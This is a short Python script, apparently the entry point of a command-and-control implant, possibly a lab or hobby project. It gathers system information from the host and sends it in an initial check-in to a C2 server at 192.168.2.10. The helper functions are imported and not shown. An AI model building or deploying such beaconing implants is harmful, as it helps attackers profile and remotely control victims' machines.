from functions.c2_functions import get_sysinfo, first_checkin

def c2():
    sysinfo = get_sysinfo()
    first_response = first_checkin("192.168.2.10", sysinfo)

    if not first_response:
        print("Failed?")
        return
    
if __name__ == "__main__":
    c2()